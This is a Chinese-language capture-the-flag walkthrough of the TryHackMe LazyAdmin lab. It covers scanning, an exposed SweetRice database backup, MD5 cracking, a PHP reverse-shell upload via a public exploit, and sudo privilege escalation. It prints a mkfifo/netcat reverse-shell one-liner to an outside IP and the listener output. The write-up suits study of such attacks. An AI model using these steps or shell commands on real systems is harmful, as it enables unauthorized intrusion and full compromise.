## 概述
來源: tryhackme  
題目: LazyAdmin  
難度: Easy  
網址: https://tryhackme.com/room/lazyadmin  
靶機 `10.10.96.37`

### 學習目標
- sweetrice 上傳漏洞
- sweetrice db backup 洩漏
- MD5 破解
- 反射 shell

## 基本掃描
### nmap
```!=
nmap -sV -sC -v 10.10.96.37  

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### gobuster
```!=
└─$ gobuster dir -u http://10.10.96.37 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.96.37
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/content              (Status: 301) [Size: 312] [--> http://10.10.96.37/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 276]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================

```

## 取得 shell
### index.php
發現疑似 sweetrice 的網站
`http://10.10.96.37/content/`

ctrl+U 發現JS  
`http://10.10.96.37/content/js/SweetRice.js`
![image](https://hackmd.io/_uploads/HkDmYEPAle.png)  
當時猜測該網站可能是 sweetrice 0.5.4 版本  
> 後來證明此是錯誤的QQ
> 不是這版 QQ

當下以為是這版 所以只查這版本的漏洞  
但沒有直接利用此漏洞 找找其他host路徑
```!=
└─$ searchsploit sweetrice 0.5.4
------------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------------ ---------------------------------
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary | php/webapps/14184.txt
------------------------------------------ ---------------------------------
Shellcodes: No Results
```

### gobuster /content
```!=
└─$ gobuster dir -u http://10.10.96.37/content -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.96.37/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/_themes              (Status: 301) [Size: 320] [--> http://10.10.96.37/content/_themes/]                                                               
/as                   (Status: 301) [Size: 315] [--> http://10.10.96.37/content/as/]                                                                    
/attachment           (Status: 301) [Size: 323] [--> http://10.10.96.37/content/attachment/]                                                            
/images               (Status: 301) [Size: 319] [--> http://10.10.96.37/content/images/]                                                                
/inc                  (Status: 301) [Size: 316] [--> http://10.10.96.37/content/inc/]                                                                   
/index.php            (Status: 200) [Size: 2197]
/js                   (Status: 301) [Size: 315] [--> http://10.10.96.37/content/js/]                                                                    
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```

### sweetrice登入頁面

重新掃描一次 `/content`  
先去 `/_theme`逛逛發現沒啥料  
接著發現登入頁面  
```!=
http://10.10.96.37/content/as/
```
用了一些基本的 admin:admin  
簡單的 sqli 都沒用  

### sweetrice帳密
之後再去其他地方逛逛  
找到 mysql_bakup  
```!=
http://10.10.96.37/content/inc/mysql_backup/
```
![image](https://hackmd.io/_uploads/BkLsRmPCle.png)
從備份檔中找到管理員帳號: manager  
加密密碼: 42f749ade7f9e195bf475f37a44cafcb  
```!
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

> ### 整體結構
> SQL：
> ```sql
> INSERT INTO `%--%_options` 
> VALUES(
>   '1',
>   'global_setting',
>   'a:17:{...}',  -- 這是序列化的內容
>   '1575023409'
> );
> ```
> 
> * `'1'` → 資料表主鍵 id
> * `'global_setting'` → 設定名稱
> * `'a:17:{...}'` → PHP 序列化後的陣列（17 個元素）
> * `'1575023409'` → UNIX 時間戳（大概是 2019 年某時間）

> ### 序列化內容解析
> 
> PHP 序列化的格式：
> 
> ```
> a:N:{k1;v1;k2;v2;...}
> ```
> 
> * `a:17` → 表示這是一個陣列，有 17 個元素
> * `s:4:"name"` → key 是字串 `"name"`，長度 4
> * `s:25:"Lazy Admin&#039;s Website"` → 對應的值是字串 `"Lazy Admin's Website"`，長度 25
> * `i:1` → 對應值是整數 1
> * `N` → 對應值是 NULL

> ### 解析後的內容
> ```php
> array(
>   "name" => "Lazy Admin's Website",
>   "author" => "Lazy Admin",
>   "title" => "",
>   "keywords" => "Keywords",
>   "description" => "Description",
>   "admin" => "manager",
>   "passwd" => "42f749ade7f9e195bf475f37a44cafcb",  
>   "close" => 1,                                     // 網站是否關閉
>   "close_tip" => '<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p>
>                   <h1>This site is building now , please come late.</h1>
>                   <p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p>
>                   <p>and uncheck the checkbox "Site close" to open your website.</p>
>                   <p>More help at <a href="http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/">Tip for Basic CMS SweetRice installed</a></p>',
>   "cache" => 0,
>   "cache_expired" => 0,
>   "user_track" => 0,
>   "url_rewrite" => 0,
>   "logo" => "",
>   "theme" => "",
>   "lang" => "en-us.php",
>   "admin_email" => NULL
> );
> ```

### MD5 破解
```!=
┌──(kali㉿kali)-[~/tryhackme/lazyadmin]
└─$ hashid 42f749ade7f9e195bf475f37a44cafcb                      
Analyzing '42f749ade7f9e195bf475f37a44cafcb'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
                   
┌──(kali㉿kali)-[~/tryhackme/lazyadmin]
└─$ echo "42f749ade7f9e195bf475f37a44cafcb" > passwd    
                      
┌──(kali㉿kali)-[~/tryhackme/lazyadmin]
└─$ hashcat -m 0 -a 0 passwd /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 1435/2935 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

42f749ade7f9e195bf475f37a44cafcb:Password123              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Thu Oct 23 12:23:27 2025 (0 secs)
Time.Estimated...: Thu Oct 23 12:23:27 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2744.9 kH/s (0.07ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 33792/14344385 (0.24%)
Rejected.........: 0/33792 (0.00%)
Restore.Point....: 32768/14344385 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: dyesebel -> redlips

Started: Thu Oct 23 12:23:27 2025
Stopped: Thu Oct 23 12:23:29 2025

```

### sweetrice 1.5.1
登入成功  
發現是 sweetrice 1.5.1 版 XD  
![image](https://hackmd.io/_uploads/SJWgk4DRgg.png)

### searchsploit

發現有上傳檔案的漏洞  
嘗試反射 shell  
```!=
└─$ searchsploit sweetrice 1.5.1
------------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------------ ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload   | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure       | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forg | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forg | php/webapps/40700.html
------------------------------------------ ---------------------------------
Shellcodes: No Results
```

發現新指令  
透過這個看一下POC  
```!=
searchsploit -x php/webapps/40716.py 
```

發現這上傳 media_center 
```!=
 uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass
```

果然有此頁面
```!=
http://10.10.96.37/content/as/?type=media_center
```

### POC 

看來上面的 POC 應該可行  
實作看看  
一樣使用此 php 調整 IP 上傳  
`/usr/share/webshells/php/php-reverse-shell.php`  

但發現怎麼傳都沒看到檔案咧？！  
後來注意到 POC 有寫要用 `.php5` 的副檔名才行  
```!=
filename = input("Enter FileName (Example:.htaccess,shell.php5,index.html) : ")
file = {'upload[]': open(filename, 'rb')}
```
果真上傳成功  
![image](https://hackmd.io/_uploads/ByoEkHPClx.png)  

點擊檔名就能訪問檔案  
路徑也跟上面的 POC 一樣  
```!=
http://10.10.96.37/content/attachment/php-reverse-shell.php5
```
> 對照剛剛的 POC
> ```!=
> if uploadfile.status_code == 200:
>         print("[+] File Uploaded...")
>         print("[+] URL : http://" + host + "/attachment/" + filename)
>         pass
> ```

所以監聽 1234 後 再度訪問檔案   
成功反射 shell  
```!=
└─$ nc -nvlp 1234             
listening on [any] 1234 ...
connect to [10.4.11.38] from (UNKNOWN) [10.10.96.37] 53544
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 07:42:48 up 52 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
取得 user.txt
```!=
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@THM-Chal:/$ ls
ls
bin    dev   initrd.img      lost+found  opt   run   srv  usr      vmlinuz.old
boot   etc   initrd.img.old  media       proc  sbin  sys  var
cdrom  home  lib             mnt         root  snap  tmp  vmlinuz
www-data@THM-Chal:/$ cd home 
cd home
www-data@THM-Chal:/home$ ls
ls
itguy
www-data@THM-Chal:/home$ cd itguy
cd itguy
www-data@THM-Chal:/home/itguy$ ls
ls
Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
Documents  Music      Public    Videos     examples.desktop  user.txt
www-data@THM-Chal:/home/itguy$ cat user.txt
cat user.txt
THM{63...07}
```

## 提權

### sudo -l
先掃 sudo 發現
`/usr/bin/perl /home/itguy/backup.pl`
```!=
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```

看一下權限  
發現我只能執行 QQ  
```!=
www-data@THM-Chal:/$ ls -la /home/itguy/backup.pl
ls -la /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
```

看一下檔案內容
```!=
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

感覺 `/etc/copy.sh` 可操作  
看一下權限 發現可讀寫  
```!=
www-data@THM-Chal:/$ ls -la /etc/copy.sh
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

把它改成執行 bash  
提權成功  
```!=
www-data@THM-Chal:/$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
www-data@THM-Chal:/$ echo '#!/bin/bash' > /etc/copy.sh
echo '#!/bin/bash' > /etc/copy.sh
www-data@THM-Chal:/$ echo '/bin/bash' >> /etc/copy.sh
echo '/bin/bash' >> /etc/copy.sh
www-data@THM-Chal:/$ cat /etc/copy.sh
cat /etc/copy.sh
#!/bin/bash
/bin/bash
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
取得 root.txt
```!=
root@THM-Chal:/# cat /root/root.txt
cat /root/root.txt
THM{66...9f}
```